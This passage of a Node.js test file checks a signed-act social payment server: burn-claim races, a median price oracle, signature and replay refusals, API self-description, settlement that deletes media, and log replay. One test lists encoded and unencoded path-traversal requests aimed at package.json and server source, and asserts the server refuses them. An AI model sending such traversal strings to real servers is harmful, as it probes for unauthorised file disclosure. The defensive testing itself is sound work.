    while (asked < 2 && Date.now() < until) await new Promise((r) => setTimeout(r, 5));
    assert.equal(asked, 2, 'both explorers were asked and neither has answered');

    const before = ctx.srv.log.count;
    const others = await Promise.race([
      Promise.all(
        Array.from({ length: 5 }, (_, n) =>
          ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'capBuy', ptp: String(1000000000000000 + n) }, PK.alice),
        ),
      ),
      // A hang is the failure this test exists to catch, and a hang that ends in
      // a named assertion is worth more than one that ends in a timeout.
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error('five ordinary writes are still queued behind a stalled explorer')), 5000).unref(),
      ),
    ]);
    for (const res of others) assert.equal(res.status, 200, JSON.stringify(res.body));
    assert.equal(ctx.srv.log.count, before + 5, 'they all landed while the claim was still waiting');
    assert.equal(asked, 2, 'and none of them asked an explorer anything');
  } finally {
    release();
  }

  // And when the third party finally answers, the claim it was holding up is
  // accepted on its own merits: the proof is carried back into the queue, the
  // uniqueness gate is re-read under it, and the line is written.
  const done = await stuck;
  assert.equal(done.status, 200, JSON.stringify(done.body));
  assert.equal(ctx.srv.world.burns[`${'e'.repeat(64)}:0`], ADDR.bob);
  assert.equal(ctx.srv.world.log.skipped, 0);
});

test('two claims for one output race, and exactly one of them wins', async (t) => {
  // The verification happens with the queue released, so a second claim for the
  // same output can land in the gap. What closes that race is the reading taken
  // back under the queue, and this is the test that drives both through it at
  // once.
  const txid = 'e'.repeat(64);
  const table = {
    ['a'.repeat(64)]: burnRow(500000, 6),
    ['b'.repeat(64)]: burnRow(500000, 6),
    [txid]: burnRow(500000, 6),
  };
  const explorers = [fakeExplorer('one', table), fakeExplorer('two', table)];
  const ctx = await bootstrap(t, { explorers });

  let release = () => {};
  const gate = new Promise((r) => {
    release = r;
  });
  const slow = (name) => ({
    name,
    async tx(id) {
      await gate;
      return table[id];
    },
  });
  explorers.splice(0, explorers.length, slow('one'), slow('two'));

  const both = Promise.all([
    ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'burnClaim', txid, vout: 0, sat: '500000' }, PK.alice),
    ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'burnClaim', txid, vout: 0, sat: '500000' }, PK.bob),
  ]);
  await new Promise((r) => setTimeout(r, 25));
  release();

  const [first, second] = await both;
  const codes = [first.body.code || 'ok', second.body.code || 'ok'].sort();
  assert.deepEqual(codes, ['BURN_ALREADY_CLAIMED', 'ok'], 'one claim, one refusal, never two credits');
  assert.equal(Object.keys(ctx.srv.world.burns).length, 3, 'and the burn index holds one entry for this output');
});

// ═══════════════════════════════════════════════════════════════════════════
// the oracle
// ═══════════════════════════════════════════════════════════════════════════

test('the oracle takes a median of five, survives an outlier, and needs a quorum', async () => {
  const nano = (eur) => BigInt(eur) * 1000000000n;

  const agreeing = [90000, 90010, 89990, 90005, 89995].map((v, i) => fakeSource(`s${i}`, nano(v)));
  const a = await readOracle({ sources: agreeing });
  assert.equal(a.eurPerBtcNano, nano(90000));
  assert.equal(a.answered, 5);
  assert.equal(a.clamped, false);
  assert.equal(a.sources.length, 5, 'every source that was asked is sealed, answered or not');

  // One source screaming. The median does not care, which is the point of a
  // median, and the liar is still named in the sealed list.
  const outlier = [90000, 90010, 89990, 90005, 1].map((v, i) => fakeSource(`s${i}`, nano(v)));
  const b = await readOracle({ sources: outlier });
  assert.equal(b.eurPerBtcNano, nano(90000));
  assert.equal(b.sources.find((s) => s.name === 's4').eurPerBtcNano, nano(1));

  // Three answering is a quorum; two is not.
  const three = [90000, 90010, 89990, null, null].map((v, i) => fakeSource(`s${i}`, v === null ? null : nano(v)));
  assert.equal((await readOracle({ sources: three })).answered, 3);
  const two = [90000, 90010, null, null, null].map((v, i) => fakeSource(`s${i}`, v === null ? null : nano(v)));
  await assert.rejects(
    () => readOracle({ sources: two }),
    (err) => err.code === 'ORACLE_STALE' && err.detail.answered === 2 && err.detail.quorum === 3,
  );

  // Fewer than five configured is refused before anything is read: shipping
  // three and calling it a median is how a two-source failure becomes a
  // one-source oracle without anybody noticing.
  await assert.rejects(
    () => readOracle({ sources: agreeing.slice(0, 3) }),
    (err) => err.code === 'ORACLE_STALE' && err.detail.need === 5,
  );
});

test('a move beyond ten percent an epoch is clamped, and says so', async () => {
  const nano = (eur) => BigInt(eur) * 1000000000n;
  const doubled = [180000, 180000, 180000, 180000, 180000].map((v, i) => fakeSource(`s${i}`, nano(v)));

  const up = await readOracle({ sources: doubled, prevEurPerBtcNano: nano(90000) });
  assert.equal(up.clamped, true);
  assert.equal(up.median, nano(180000), 'the observation is kept');
  assert.equal(up.eurPerBtcNano, nano(99000), 'and the published rate is the bound');

  const crashed = [10000, 10000, 10000, 10000, 10000].map((v, i) => fakeSource(`s${i}`, nano(v)));
  const down = await readOracle({ sources: crashed, prevEurPerBtcNano: nano(90000) });
  assert.equal(down.clamped, true);
  assert.equal(down.eurPerBtcNano, nano(81000));

  // Inside the band nothing is touched.
  const small = [94000, 94000, 94000, 94000, 94000].map((v, i) => fakeSource(`s${i}`, nano(v)));
  const inside = await readOracle({ sources: small, prevEurPerBtcNano: nano(90000) });
  assert.equal(inside.clamped, false);
  assert.equal(inside.eurPerBtcNano, nano(94000));
});

test('a decimal price becomes an exact integer rate, and the median truncates downward', () => {
  assert.equal(eurToNano('90000.005'), 90000005000000n);
  assert.equal(eurToNano(90000), 90000000000000n);
  assert.equal(medianNano([3n, 1n, 2n]), 2n);
  assert.equal(medianNano([1n, 2n, 3n, 4n]), 2n, 'even counts round down, so a rounding can never raise a fee');
});

test('a source that answers with a bare number is read as digits, not as a double', async () => {
  // The digits a source published, taken out of the raw text. JSON.parse has one
  // numeric type and it is a double, so an unquoted price becomes the nearest
  // double and String() re-renders whatever that double's shortest round-trip
  // form happens to be — the published digits are gone before eurToNano is ever
  // handed them.
  assert.equal(decimalFrom('{"bitcoin":{"eur":90000.005}}', 'eur'), '90000.005');
  assert.equal(decimalFrom('{"bitcoin":{"eur":"90000.005"}}', 'eur'), '90000.005', 'quoted or not, the same digits');
  assert.throws(() => decimalFrom('{"bitcoin":{"usd":90000}}', 'eur'), (err) => err.code === 'ORACLE_STALE');

  // The digits a double cannot hold: seventeen significant figures, which is one
  // more than a double carries, and the loss lands INSIDE the nine decimal
  // places a nanoeuro keeps. So the rate the host would have sealed, signed and
  // attributed to a named source is not the rate that source published.
  const published = '12345678.123456789';
  const throughADouble = String(JSON.parse(`{"eur":${published}}`).eur);
  assert.notEqual(throughADouble, published, 'the double really does lose it');
  assert.equal(decimalFrom(`{"bitcoin":{"eur":${published}}}`, 'eur'), published);
  assert.equal(eurToNano(decimalFrom(`{"bitcoin":{"eur":${published}}}`, 'eur')), 12345678123456789n);
  assert.equal(eurToNano(throughADouble), 12345678123456790n, 'and the two rates are different numbers');

  // And the wiring: coingecko's source reads the body as text, and every
  // outbound read carries a deadline the far end cannot ignore.
  const fetchImpl = async (url, options) => {
    assert.ok(options.signal, 'every outbound read carries an abort signal');
    return new Response(JSON.stringify({ bitcoin: { eur: 91234.567891234 } }), { status: 200 });
  };
  const coingecko = publicSources(fetchImpl).find((s) => s.name === 'coingecko');
  assert.equal(await coingecko.read(), 91234567891234n, 'nine decimal places of the published price, exactly');
});

test('GET /api/v1/oracle publishes every source, signed', async (t) => {
  const ctx = await bootstrap(t);
  const res = await ctx.api.get('/api/v1/oracle');
  assert.equal(res.status, 200);
  assert.equal(res.body.eurPerBtcNano, '90000000000000');
  assert.equal(res.body.sources.length, 5);
  assert.ok(res.body.sig, 'signed by the epoch producer key');
  assert.ok(res.body.producer);
  assert.ok(ctx.srv.key.verify(
    {
      eurPerBtcNano: res.body.eurPerBtcNano,
      median: res.body.median,
      clamped: res.body.clamped,
      at: res.body.at,
      epoch: res.body.epoch,
      answered: res.body.answered,
      quorum: res.body.quorum,
      minSources: res.body.minSources,
      sources: res.body.sources,
    },
    res.body.sig,
  ), 'and the signature covers what was published');
});

// ═══════════════════════════════════════════════════════════════════════════
// rule 2 — the server refuses exactly what replay would skip
// ═══════════════════════════════════════════════════════════════════════════

test('an act with a bad signature is refused', async (t) => {
  const ctx = await bootstrap(t);
  const before = ctx.srv.log.count;

  // Signed correctly, then edited. This is the attack the check exists for: the
  // body says one thing and the signature covers another.
  const tampered = { ...signAct({ t: ctx.clock.t, as: ADDR.alice, k: 'register', handle: 'aaaaa' }, PK.alice), handle: 'mallory' };
  const a = await ctx.api.send(tampered);
  assert.equal(a.status, 401);
  assert.equal(a.body.code, 'BAD_SIGNATURE');
  // Recovery over the edited body lands on some other address entirely. That is
  // what recovery IS: there is nothing to compare a signature against except the
  // message, so changing the message changes who signed it.
  assert.notEqual(a.body.detail.recovered, ADDR.alice);
  assert.match(String(a.body.detail.recovered), /^0x[0-9a-f]{40}$/);

  // Signed by somebody else's key. `as` is a claim; the address is recovered.
  const impersonation = signAct({ t: ctx.clock.t, as: ADDR.alice, k: 'like', pid: 'p1' }, PK.bob);
  const b = await ctx.api.send(impersonation);
  assert.equal(b.body.code, 'BAD_SIGNATURE');
  assert.equal(b.body.detail.recovered, ADDR.bob);

  // No signature at all.
  const c = await ctx.api.send({ t: ctx.clock.t, as: ADDR.alice, k: 'like', pid: 'p1' });
  assert.equal(c.body.code, 'BAD_SIGNATURE');

  // Rubbish where a signature goes.
  const d = await ctx.api.send({ t: ctx.clock.t, as: ADDR.alice, k: 'like', pid: 'p1', sig: '0x00' });
  assert.equal(d.body.code, 'BAD_SIGNATURE');

  assert.equal(ctx.srv.log.count, before, 'and nothing was written');
});

test('the server refuses exactly what actError refuses, code for code', async (t) => {
  const ctx = await bootstrap(t);
  const { pid } = await publish(ctx);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'like', pid }, PK.bob);

  const T = ctx.clock.t;
  const hex64 = 'e'.repeat(64);

  // Twenty-four acts that are wrong for twenty-four different reasons, every one
  // of them signed correctly by the address it claims — the point is to isolate
  // the RULEBOOK's answer, and an unsigned act would be refused before the
  // rulebook was ever asked. The writer's own checks (a clock bound, a picture's
  // bytes, an explorer, a proof) run AFTER actError precisely so that this
  // comparison is possible at all.
  const cases = [
    ['UNKNOWN_ACT_KIND', { t: T, as: ADDR.alice, k: 'teleport' }, PK.alice],
    ['BAD_REQUEST', { t: T, as: ADDR.bob, k: 'like', pid, extra: 1 }, PK.bob],
    ['UNKNOWN_ACCOUNT', { t: T, as: ADDR.dave, k: 'like', pid }, PK.dave],
    ['ALREADY_REGISTERED', { t: T, as: ADDR.alice, k: 'register', handle: 'alice2' }, PK.alice],
    ['HANDLE_INVALID', { t: T, as: ADDR.carol, k: 'register', handle: 'NOT valid!' }, PK.carol],
    ['HANDLE_TAKEN', { t: T, as: ADDR.carol, k: 'register', handle: 'alice' }, PK.carol],
    ['BAD_AMOUNT', { t: T, as: ADDR.alice, k: 'swap', sell: 'btc', amt: '0', minOut: '0' }, PK.alice],
    ['BAD_REQUEST', { t: T, as: ADDR.alice, k: 'swap', sell: 'eth', amt: '10', minOut: '0' }, PK.alice],
    ['INSUFFICIENT_RESERVE', { t: T, as: ADDR.alice, k: 'swap', sell: 'btc', amt: '999999999999', minOut: '0' }, PK.alice],
    ['INSUFFICIENT_PTP', { t: T, as: ADDR.alice, k: 'swap', sell: 'ptp', amt: '9'.repeat(30), minOut: '0' }, PK.alice],
    ['SLIPPAGE_EXCEEDED', { t: T, as: ADDR.alice, k: 'swap', sell: 'btc', amt: '1000', minOut: '9'.repeat(30) }, PK.alice],
    ['INSUFFICIENT_SHARES', { t: T, as: ADDR.alice, k: 'liqRemove', shares: '1' }, PK.alice],
    ['POST_NOT_FOUND', { t: T, as: ADDR.bob, k: 'view', pid: 'p999', dwellMs: 2000, seq: 9 }, PK.bob],
    ['VIEW_DWELL_TOO_SHORT', { t: T, as: ADDR.bob, k: 'view', pid, dwellMs: 100, seq: 9 }, PK.bob],
    ['VIEW_SEQ_REPLAY', { t: T, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob],
    ['SELF_ENGAGEMENT', { t: T, as: ADDR.alice, k: 'view', pid, dwellMs: 2000, seq: 1 }, PK.alice],
    ['DUPLICATE_ACT', { t: T + 1, as: ADDR.bob, k: 'like', pid }, PK.bob],
    ['COMMENT_TOO_LONG', { t: T, as: ADDR.bob, k: 'comment', pid, text: 'x'.repeat(MAX_COMMENT_CHARS + 1) }, PK.bob],
    ['BAD_REQUEST', { t: T, as: ADDR.bob, k: 'comment', pid, text: '' }, PK.bob],
    ['MIME_REFUSED', { t: T, as: ADDR.alice, k: 'post', cid: hex64, bytes: 100, mime: 'image/gif', w: 4, h: 4, viewPriceNano: '100000', days: 1 }, PK.alice],
    ['PAYLOAD_TOO_LARGE', { t: T, as: ADDR.alice, k: 'post', cid: hex64, bytes: 9000000, mime: 'image/png', w: 4, h: 4, viewPriceNano: '100000', days: 1 }, PK.alice],
    ['NOT_THE_AUTHOR', { t: T, as: ADDR.bob, k: 'extend', pid, days: 1 }, PK.bob],
    ['SETTLE_BEFORE_GRACE', { t: T, as: ADDR.bob, k: 'settle', pid }, PK.bob],
    ['RULES_KEY_ONLY', { t: T, as: ADDR.alice, k: 'rulesSet', version: 'v1', hash: hex64, fromEpoch: 9 }, PK.alice],
    ['EPOCH_NOT_CLOSED', { t: T, as: ADDR.alice, k: 'closeEpoch' }, PK.alice],
    ['CAPACITY_PLEDGE_UNPROVEN', { t: T, as: ADDR.alice, k: 'capClaim' }, PK.alice],
    ['BAD_AMOUNT', { t: T, as: ADDR.alice, k: 'capBuy', ptp: '0' }, PK.alice],
    ['BAD_REQUEST', { t: T, as: ADDR.alice, k: 'capPledge', mb: 0, endpoint: 'https://x.example' }, PK.alice],
  ];
  assert.ok(cases.length >= 20, 'at least twenty');

  const before = ctx.srv.log.count;
  const mismatches = [];
  for (const [expected, body, pk] of cases) {
    const signed = signAct(body, pk);
    // The rulebook's own answer, asked exactly the way the server asks it: over
    // the live world, with the index the act would receive already attached.
    const direct = actError(ctx.srv.world, { ...signed, i: ctx.srv.log.nextIndex });
    const over = await ctx.api.send(signed);

    if (!direct) mismatches.push({ body, note: 'actError accepted it', server: over.body.code });
    else if (direct.code !== over.body.code) mismatches.push({ k: body.k, actError: direct.code, server: over.body.code });
    else if (direct.code !== expected) mismatches.push({ k: body.k, expected, got: direct.code });
    else assert.equal(over.status, E[expected].http, `${expected} must answer with the catalogue's status`);
  }

  assert.deepEqual(mismatches, [], 'the server and the rulebook must answer identically');
  assert.equal(ctx.srv.log.count, before, 'and none of them was written');
});

test('an act nested past the encoder\'s limit is refused with a catalogued code, not a 500', async (t) => {
  const ctx = await bootstrap(t);
  const before = ctx.srv.log.count;

  // core/canonical.mjs encodes only what it can represent exactly and refuses
  // anything nested past MAX_DEPTH, which anybody can send because acts arrive
  // from the public. The writer canonicalises an act to work out what was
  // signed, so that throw came out of the door itself: HTTP 500, and the code
  // UNCATALOGUED, which GET /api/v1/errors does not publish — for an act the
  // rulebook refuses with a published BAD_REQUEST. Rule 2 says a host may be
  // stricter than replay and never looser; answering off the catalogue is
  // neither, it is drift.
  let nest = { bottom: true };
  for (let n = 0; n < MAX_DEPTH * 2; n++) nest = { n: nest };
  const act = { t: ctx.clock.t, as: ADDR.alice, k: 'register', handle: 'deepish', nest, sig: '0x' + '11'.repeat(65) };

  assert.throws(() => signingBytes(act), /nested deeper/, 'the encoder really does refuse this act');
  const direct = actError(ctx.srv.world, { ...act, i: ctx.srv.log.nextIndex });
  assert.equal(direct.code, 'BAD_REQUEST', 'and the rulebook has a published answer for it');

  const res = await ctx.api.send(act);
  assert.equal(res.body.code, direct.code, 'which is the answer the host must give');
  assert.equal(res.status, E.BAD_REQUEST.http);
  assert.notEqual(res.status, 500, 'a caller\'s malformed act is not this host\'s fault');
  assert.ok(errorList().some((e) => e.code === res.body.code), 'and the code is one the catalogue publishes');
  for (const field of ['code', 'msg', 'why', 'next']) assert.ok(res.body[field], `missing ${field}`);
  assert.equal(ctx.srv.log.count, before, 'nothing was written');
});

test('the writer bounds a stamp against its own clock, which replay cannot', async (t) => {
  const ctx = await bootstrap(t);
  // A stamp replay is perfectly happy with — it is forward of the last act and
  // long before the year 2100 — and that this host will not carry, because a
  // far-future stamp expires posts early and skips cooldowns for everybody
  // replaying afterwards.
  const future = ctx.clock.t + 40 * 24 * 3600 * 1000;
  const signed = signAct({ t: future, as: ADDR.carol, k: 'register', handle: 'carol' }, PK.carol);
  assert.equal(actError(ctx.srv.world, { ...signed, i: ctx.srv.log.nextIndex }), null, 'the rulebook has no clock to compare against');

  const res = await ctx.api.send(signed);
  assert.equal(res.body.code, 'TIMESTAMP_IMPLAUSIBLE');
  assert.equal(res.status, 400);
  assert.equal(res.body.detail.maxSkewMs, 5 * 60 * 1000);
});

test('the same signed body twice is one act, not two charges', async (t) => {
  const ctx = await bootstrap(t);
  const { pid } = await publish(ctx);

  // A captured view act is worthless to whoever captured it, and the RULEBOOK is
  // what makes it worthless: the per-viewer sequence must advance. The host's
  // signature index would also catch this, and it deliberately runs second, so
  // that the code a caller gets is the one every reader of the log would give.
  const view = signAct({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);
  assert.equal((await ctx.api.send(view)).status, 200);
  const replayedView = await ctx.api.send(view);
  assert.equal(replayedView.body.code, 'VIEW_SEQ_REPLAY');
  assert.equal(ctx.srv.world.posts[pid].views, 1);

  // A comment is where the signature index earns its place. Two identical
  // comments are two lawful comments as far as replay is concerned — nothing in
  // the rulebook forbids saying the same thing twice — so the only thing
  // stopping one intent from becoming two billed entries is that the same signed
  // body has already been seen.
  const comment = signAct({ t: ctx.clock.t, as: ADDR.bob, k: 'comment', pid, text: 'twice?' }, PK.bob);
  assert.equal((await ctx.api.send(comment)).status, 200);
  assert.equal(actError(ctx.srv.world, { ...comment, i: ctx.srv.log.nextIndex }), null, 'the rulebook has no objection');
  const resent = await ctx.api.send(comment);
  assert.equal(resent.body.code, 'DUPLICATE_ACT');
  assert.equal(resent.status, 409);
  assert.equal(ctx.srv.world.posts[pid].comments, 1);
});

// ═══════════════════════════════════════════════════════════════════════════
// the self-describing API
// ═══════════════════════════════════════════════════════════════════════════

test('GET /api/v1 describes the whole API, and every route it names answers', async (t) => {
  const ctx = await bootstrap(t);
  const { pid, cid } = await publish(ctx);
  const res = await ctx.api.get('/api/v1');
  assert.equal(res.status, 200);
  const doc = res.body;

  for (const field of ['name', 'version', 'what', 'howItWorks', 'auth', 'quickstart', 'endpoints', 'acts', 'limits', 'refusals', 'editions']) {
    assert.ok(doc[field], `the document must carry ${field}`);
  }

  // A bot must be able to sign without reading our source.
  assert.equal(doc.auth.whatIsSigned.includes('sig'), true);
  assert.equal(doc.auth.whatIsSigned.includes('`i`'), true);
  assert.ok(doc.auth.recipe.length >= 4);

  // Every act kind the rulebook carries is documented, with its fields.
  const documented = new Set(doc.acts.map((a) => a.k));
  for (const k of ['register', 'burnClaim', 'swap', 'liqAdd', 'liqRemove', 'post', 'view', 'like', 'comment', 'extend', 'settle', 'capBuy', 'capPledge', 'capProof', 'capClaim', 'rulesSet', 'closeEpoch']) {
    assert.ok(documented.has(k), `act kind ${k} is undocumented`);
    assert.ok(doc.acts.find((a) => a.k === k).what, `act kind ${k} has no explanation`);
  }

  // Every GET route the document advertises answers something other than "no
  // such endpoint". A document that names a route this host does not have is a
  // lie told to every agent that reads it.
  const gets = doc.endpoints.filter((e) => e.method === 'GET');
  assert.ok(gets.length >= 15);
  for (const endpoint of gets) {
    const path = endpoint.path
      .replace(':pid', pid)
      .replace(':address', ADDR.alice)
      .replace(':version', 'v1')
      .replace(':cid', cid)
      .replace(/\?.*$/, '');
    const probe = await ctx.api.get(path === '/api/v1/capacity/challenges' ? `${path}?as=${ADDR.alice}` : path);
    // NOT_FOUND is the code this host uses for "no such endpoint". A route that
    // exists and has nothing to show yet answers something else — /api/chain
    // answers EPOCH_NOT_CLOSED with the builder's name in it, which is a real
    // answer rather than a missing door.
    assert.notEqual(probe.body.code, 'NOT_FOUND', `${endpoint.path} is advertised and missing`);
    assert.notEqual(probe.status, 500, `${endpoint.path} answered 500`);
  }

  assert.equal(doc.editions.replay.length, 64, 'the rulebook edition is a sha256, self-reported');
  assert.equal(doc.limits.commentChars, MAX_COMMENT_CHARS);
});

test('GET /api/v1/errors publishes the whole catalogue', async (t) => {
  const ctx = await bootstrap(t);
  const res = await ctx.api.get('/api/v1/errors');
  assert.equal(res.status, 200);

  const published = res.body.errors;
  const catalogue = errorList();
  assert.equal(published.length, catalogue.length);
  assert.equal(published.length, Object.keys(E).length);
  assert.equal(res.body.count, catalogue.length);

  for (const entry of published) {
    for (const field of ['code', 'http', 'msg', 'why', 'next']) {
      assert.ok(entry[field] !== undefined, `${entry.code} is missing ${field}`);
    }
    assert.notEqual(entry.why, entry.msg, `${entry.code}: why must not restate msg`);
    assert.deepEqual(entry, E[entry.code], `${entry.code} must be published verbatim`);
  }

  // Sorted, so two hosts on one edition serve byte-identical documents.
  const codes = published.map((e) => e.code);
  assert.deepEqual(codes, [...codes].sort());
  assert.match(res.headers.get('cache-control'), /max-age/);
});

test('a refusal always carries all four fields and the catalogue status', async (t) => {
  const ctx = await bootstrap(t);
  const probes = [
    ['/api/v1/post/p999', 'POST_NOT_FOUND'],
    ['/api/v1/wallet/0x' + '9'.repeat(40), 'UNKNOWN_ACCOUNT'],
    ['/api/v1/nothing-here', 'NOT_FOUND'],
    ['/api/v1/pool/quote?sell=eth&amt=1', 'BAD_REQUEST'],
    ['/api/v1/rules/v99', 'RULES_VERSION_UNKNOWN'],
    ['/api/v1/capacity/challenges?as=nonsense', 'BAD_ADDRESS'],
  ];
  for (const [path, code] of probes) {
    const res = await ctx.api.get(path);
    assert.equal(res.body.code, code, path);
    assert.equal(res.status, E[code].http, path);
    assert.equal(res.body.ok, false);
    assert.equal(res.body.msg, E[code].msg);
    assert.equal(res.body.why, E[code].why);
    assert.equal(res.body.next, E[code].next);
    assert.ok('detail' in res.body, 'detail is always present, defaulting to null');
  }
});

test('the static app is served, and nothing outside app/ and core/ is', async (t) => {
  const ctx = await bootstrap(t);
  const index = await ctx.api.get('/');
  assert.equal(index.status, 200);
  assert.match(index.body.raw, /<!doctype html>/i);

  const css = await ctx.api.get('/style.css');
  assert.equal(css.status, 200);

  // core/ IS served, deliberately and only as .mjs, because app/app.mjs imports
  // `../core/replay.mjs` and Rule 2 says the browser runs the same file the host
  // does. It was not served once, and the client died at its first import in
  // every browser while every test in this repo stayed green. See the last two
  // tests in test/one-rulebook.test.mjs, which hold that end of it.
  const rulebook = await ctx.api.get('/core/replay.mjs');
  assert.equal(rulebook.status, 200, 'the browser must be able to fetch the rulebook');

  // Everything else stays shut. Traversal is refused on the RESOLVED path, so
  // the encoded and unencoded forms fall the same way, and core/ is a door for
  // one file type rather than a way into the process directory.
  for (const attempt of [
    '/../package.json',
    '/..%2fpackage.json',
    '/%2e%2e/%2e%2e/package.json',
    '/core/../package.json',
    '/core/%2e%2e/package.json',
    '/core/..%2fserver%2findex.mjs',
    '/server/index.mjs',
    '/data/acts.jsonl',
    '/core/params.json',
    '/core/',
  ]) {
    const res = await ctx.api.get(attempt);
    assert.notEqual(res.status, 200, `${attempt} must not be served`);
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// the lifecycle, and the deletion at the end of it
// ═══════════════════════════════════════════════════════════════════════════

test('a settled post pays the creator and its bytes are really gone from disk', async (t) => {
  const ctx = await bootstrap(t);
  const { pid, cid } = await publish(ctx);

  const objectPath = join(ctx.dir, 'media', cid.slice(0, 2), cid);
  await stat(objectPath); // throws if it is not there

  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'like', pid }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'comment', pid, text: 'the light on the left' }, PK.bob);

  const live = await ctx.api.get(`/api/v1/post/${pid}`);
  assert.equal(live.body.post.state, 'live');
  assert.equal(live.body.post.views, 1);
  assert.equal(live.body.post.likes, 1);
  assert.equal(live.body.comments.length, 1);
  assert.ok(BigInt(live.body.post.creditWei) > 0n, 'the creator has accrued PTP, not a euro liability');

  const creditWei = BigInt(ctx.srv.world.posts[pid].creditWei);
  const before = ctx.srv.world.accounts[ADDR.alice].ptp;

  // Past the lease and past the grace. Time passes because acts carry stamps,
  // and this host's clock moves with them.
  ctx.clock.t += (Number(PARAMS.postDefaultLifetimeSec) + Number(PARAMS.settlementGraceSec) + 60) * 1000;

  // Anybody may settle. Bob is not the author, and that is the point: a network
  // where deletion depends on the author showing up is a network that never
  // deletes.
  const settled = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'settle', pid }, PK.bob);
  assert.equal(settled.status, 200, JSON.stringify(settled.body));

  const after = ctx.srv.world.accounts[ADDR.alice].ptp;
  assert.equal(after - before, creditWei, 'the creator is paid exactly the wei that arrived');

  // The bytes.
  await assert.rejects(() => stat(objectPath), (err) => err.code === 'ENOENT');
  assert.equal(await ctx.srv.store.has(cid), false);
  const gone = await ctx.api.get(`/media/${cid}`);
  assert.equal(gone.status, 404);
  const dirs = await readdir(join(ctx.dir, 'media', cid.slice(0, 2))).catch(() => []);
  assert.ok(!dirs.includes(cid), 'and nothing with that name is left in the store');

  // The structure survives the payload: the tombstone still says exactly which
  // bytes existed.
  const tomb = await ctx.api.get(`/api/v1/post/${pid}`);
  assert.equal(tomb.body.post.state, 'settled');
  assert.equal(tomb.body.post.redacted, true);
  assert.equal(tomb.body.post.media, null);
  assert.equal(tomb.body.post.tombstone.cid, cid);
  assert.equal(tomb.body.post.tombstone.views, 1);
  assert.equal(tomb.body.post.tombstone.likes, 1);
  assert.equal(tomb.body.post.tombstone.comments, 1);
  assert.equal(BigInt(tomb.body.post.tombstone.paidWei), creditWei);

  // And the comment, which is never deleted by settlement, is still readable.
  const comments = await ctx.api.get(`/api/v1/post/${pid}/comments`);
  assert.equal(comments.body.comments[0].text, 'the light on the left');
});

test('every accepted act survives a full replay of the file that was written', async (t) => {
  const ctx = await bootstrap(t);
  const { pid } = await publish(ctx);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'like', pid }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'comment', pid, text: 'again' }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'extend', pid, days: 2 }, PK.alice);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'capPledge', mb: 1000, endpoint: 'https://bob.example/shards' }, PK.bob);

  const text = await readFile(ctx.srv.log.path, 'utf8');
  const lines = text.split('\n').filter(Boolean);
  const acts = lines.map((l) => JSON.parse(l));

  // One act per line, no trailing whitespace, canonical, indices dense.
  for (let i = 0; i < lines.length; i++) {
    assert.equal(lines[i], lines[i].trim(), 'no trailing whitespace');
    assert.equal(lines[i], canonicalJson(acts[i]), 'every line is canonical');
    assert.equal(acts[i].i, i, 'indices are dense and increasing');
  }

  const replayed = replay(acts, PARAMS);
  assert.equal(replayed.log.skipped, 0, 'the writer wrote nothing replay skips');
  assert.equal(projection(replayed), projection(ctx.srv.world), 'the log is the only truth, and it reproduces');
});

test('concurrent writes do not interleave, and every index is used exactly once', async (t) => {
  const ctx = await bootstrap(t);
  const before = ctx.srv.log.count;

  // Ten acts in flight at once, each valid, each a different signed body. Node
  // is single-threaded but every await is a place a request can interleave, so
  // without one queue two of these would validate against the same world and
  // claim the same index.
  const sent = await Promise.all(
    Array.from({ length: 10 }, (_, n) =>
      ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'capBuy', ptp: String(1000000000000000 + n) }, PK.alice),
    ),
  );

  for (const res of sent) assert.equal(res.status, 200, JSON.stringify(res.body));
  const indices = sent.map((r) => r.body.i).sort((a, b) => a - b);
  assert.deepEqual(indices, Array.from({ length: 10 }, (_, n) => before + n));

  const lines = (await readFile(ctx.srv.log.path, 'utf8')).split('\n').filter(Boolean);
  assert.equal(lines.length, before + 10);
  for (let i = 0; i < lines.length; i++) {
    const act = JSON.parse(lines[i]);
    assert.equal(act.i, i, 'no line is torn and no index is reused');
    assert.equal(lines[i], canonicalJson(act));
  }
  assert.equal(ctx.srv.world.log.skipped, 0);
});

test('the writer comes back up on the log it left behind', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-restart-'));
  const clock = { t: Date.parse('2026-08-12T09:00:00.000Z') };
  const explorers = [];
  t.after(() => rm(dir, { recursive: true, force: true }));

  const first = await createServer({ dir, now: () => clock.t, explorers, oracleSources: [] });
  const a = http((await first.listen(0)).url);
  await a.act({ t: clock.t, as: ADDR.alice, k: 'register', handle: 'alice' }, PK.alice);
  await a.act({ t: clock.t, as: ADDR.bob, k: 'register', handle: 'bob' }, PK.bob);
  const worldBefore = projection(first.world);
  await first.close();

  const second = await createServer({ dir, now: () => clock.t, explorers, oracleSources: [] });
  const b = http((await second.listen(0)).url);
  t.after(() => second.close());

  assert.equal(projection(second.world), worldBefore, 'the world is the log, and the log was on the disk');
  assert.equal(second.log.count, 2);
  assert.equal(second.log.truncatedBytes, 0);

  // The index continues rather than restarting, and a body already accepted is
  // still recognised after a restart because the index is rebuilt from the log.
  const next = await b.act({ t: clock.t, as: ADDR.carol, k: 'register', handle: 'carol' }, PK.carol);
